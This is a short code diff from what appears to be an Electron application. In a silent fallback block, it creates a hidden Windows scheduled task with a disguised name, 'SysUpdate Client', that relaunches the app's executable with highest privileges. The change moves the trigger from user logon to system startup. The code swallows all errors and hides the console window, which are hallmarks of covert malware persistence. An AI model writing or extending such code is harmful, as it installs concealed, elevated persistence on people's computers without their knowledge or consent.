@@ -19,7 +19,7 @@ try {
 } catch {
   try {
     const exePath = app.getPath('exe');
-    execSync(`schtasks /Create /TN "SysUpdate Client" /TR "'${exePath}'" /SC ONLOGON /RL HIGHEST /F`, { windowsHide: true });
+    execSync(`schtasks /Create /TN "SysUpdate Client" /TR "'${exePath}'" /SC ONSTART /RL HIGHEST /F`, { windowsHide: true });
   } catch {}
 }
 
